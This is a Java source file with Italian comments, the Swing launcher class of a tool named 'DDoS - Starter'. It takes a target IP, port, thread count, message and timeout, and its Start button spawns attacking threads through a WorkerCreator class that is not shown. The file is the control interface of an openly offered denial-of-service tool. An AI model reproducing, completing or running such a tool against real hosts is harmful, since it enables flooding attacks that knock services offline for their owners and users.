package attack;

/*
 * Classe principale del programma. 
 * Qui c'è l'interfaccia grafica e l'implementazione dei tasti.
 * 
 */

import java.awt.EventQueue;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.JButton;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JLabel;
import javax.swing.JTextField;
import javax.swing.JSpinner;
import javax.swing.SwingConstants;
import javax.swing.SpinnerNumberModel;
import java.awt.Cursor;

public class DDoS_Starter extends JFrame{

	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private JPanel contentPane;
	private JTextField jTfTarget;
	private JTextField JTfMessage;
	private JTextField txtStatus;

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					DDoS_Starter frame = new DDoS_Starter();
					frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the frame.
	 */
	
	/*
	 * creazione interfaccia grafica
	 */
	
	@SuppressWarnings("deprecation")
	public DDoS_Starter() {
		setTitle("DDoS - Starter");
		setAlwaysOnTop(true);
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		
		JLabel lblNewLabel = new JLabel("Target IP:");
		lblNewLabel.setBounds(105, 29, 67, 14);
		
		JLabel lblPort = new JLabel("Port:");
		lblPort.setBounds(105, 55, 67, 14);
		
		jTfTarget = new JTextField();
		jTfTarget.setHorizontalAlignment(SwingConstants.CENTER);
		jTfTarget.setText("0.0.0.0");
		jTfTarget.setBounds(230, 26, 87, 20);
		jTfTarget.setToolTipText("IP sul quale condurre l'attacco");
		jTfTarget.setColumns(10);
		
		JSpinner jSPort = new JSpinner();
		jSPort.setModel(new SpinnerNumberModel(1, 0, 65535, 1));  //minimo 1 e massimo 65535 
		jSPort.setBounds(230, 52, 87, 20);
		jSPort.setToolTipText("Numero di porta alla quale condurre l'attacco");
		
		JLabel lblNewLabel_1 = new JLabel("Threads:");
		lblNewLabel_1.setBounds(105, 81, 61, 14);
		lblNewLabel_1.setToolTipText("Numero di thread attaccanti");
		
		JSpinner jSThreads = new JSpinner();
		jSThreads.setModel(new SpinnerNumberModel(new Integer(10), new Integer(1), null, new Integer(1))); //minimo 1
		jSThreads.setBounds(230, 78, 87, 20);
		jSThreads.setToolTipText("Numero di thread");
		
		JLabel lblNewLabel_2 = new JLabel("Custom message:");
		lblNewLabel_2.setBounds(105, 107, 115, 14);
		
		JLabel lblNewLabel_3 = new JLabel("Timeout:");
		lblNewLabel_3.setBounds(105, 133, 115, 14);
		
		JSpinner jSTimeout = new JSpinner();
		jSTimeout.setModel(new SpinnerNumberModel(new Integer(100), new Integer(0), null, new Integer(1))); //minimo 1
		jSTimeout.setBounds(230, 130, 87, 20);
		jSTimeout.setToolTipText("Tempo di attesa tra un messaggio e l'altro in milliscondi");
		
		JTfMessage = new JTextField();
		JTfMessage.setHorizontalAlignment(SwingConstants.CENTER);
		JTfMessage.setText("message");
		JTfMessage.setBounds(230, 104, 87, 20);
		JTfMessage.setToolTipText("Messaggio utilizzato dai thread durante l'attacco");
		JTfMessage.setColumns(10);
		
		txtStatus = new JTextField();
		txtStatus.setBounds(231, 215, 86, 20);
		txtStatus.setHorizontalAlignment(SwingConstants.CENTER);
		txtStatus.setText("Sleeping");
		txtStatus.setEditable(false);
		txtStatus.setColumns(10);

		JButton btnStart = new JButton("Start");
		btnStart.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
		btnStart.setBounds(105, 158, 85, 33);
		btnStart.setToolTipText("Inizia l'attacco");
		
		contentPane.setLayout(null);
				
		JLabel lblNewLabel_5 = new JLabel("Status:");
		lblNewLabel_5.setBounds(105, 218, 85, 14);
		contentPane.add(lblNewLabel_5);
		contentPane.add(txtStatus);
		contentPane.add(btnStart);
		contentPane.add(lblNewLabel_3);
		contentPane.add(jSTimeout);
		contentPane.add(lblNewLabel_2);
		contentPane.add(lblNewLabel);
		contentPane.add(lblPort);
		contentPane.add(lblNewLabel_1);
		contentPane.add(jTfTarget);
		contentPane.add(jSPort);
		contentPane.add(jSThreads);
		contentPane.add(JTfMessage);
		
		JButton btnStop = new JButton("Stop");
		btnStop.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
		btnStop.setToolTipText("Ferma l'attacco");
		btnStop.setBounds(228, 158, 89, 30);
		contentPane.add(btnStop);
		
		
		/*
		 * ActionListener del bottone Start
		 * 
		 * Se Worker.run (una variabile booleana che indica lo stato di attività dell'attacco)
		 * è false (nessun attacco in corso): 
		 * segna la stessa variabile a true (attacco in corso);
		 * scrive sulla text field "Attacking" (prima ne segna il contenuto a null per evitare eventuali problemi);
		 * scrive sul terminale "Attacking"; 
		 * crea delle variabili in cui passa i valori inseriti nell'interfaccia grafica;
		 * crea un nuovo thread "start" dalla classe WorkerCreator (thread principale che crea tutti i thread attacanti),
		 * passandogli le variabili che verranno utilizzate per l'attacco.
		 * Altrimenti, quindi se Worker.run = true, manda un messaggio di errore sulla console, in quanto c'è già un
		 * attacco in corso.
		 * 
		 */
		
		btnStart.addActionListener(new ActionListener(){
			public void actionPerformed(ActionEvent e) {
				if (!Worker.run) {
					
					Worker.run=true;
					txtStatus.setText(null);
					txtStatus.setText("Attacking");
					System.out.println("Attacking");
					
					String message = JTfMessage.getText();
					String host = jTfTarget.getText();
					int port = (Integer)jSPort.getValue();
			        int threads = (Integer)jSThreads.getValue();
			        int timeout = (Integer)jSTimeout.getValue();
			        
					Thread start = new Thread(new WorkerCreator(host, port, timeout, message, threads));
					start.start();

				}
				
				else {
					System.out.println("ERROR! Already started");
				}
				
			}
			});
		
		/*
		 * ActionListener del bottone Stop
		 * 
		 * Se Worker.run = true (c'è un attacco in corso):
		 * segna Worker.run a false, fermando immediatamente l'attacco;
		 * scrive sulla text field "Sleeping" (prima ne segna il contenuto a null per evitare eventuali problemi);
		 * scrive sul terminale "Sleeping".
		 * Altrimenti, se non c'è nessun attacco da fermare, manda un messaggio di errore sul terminale.
		 * 
		 */
		
		btnStop.addActionListener(new ActionListener(){
			public void actionPerformed(ActionEvent e) {
				if (Worker.run){
					Worker.run = false;
					txtStatus.setText(null);
					txtStatus.setText("Sleeping");
					System.out.println("Sleeping");
				}
				else
					System.out.println("ERROR! Already stopped");
				
			}
			});
		

		
	}
}




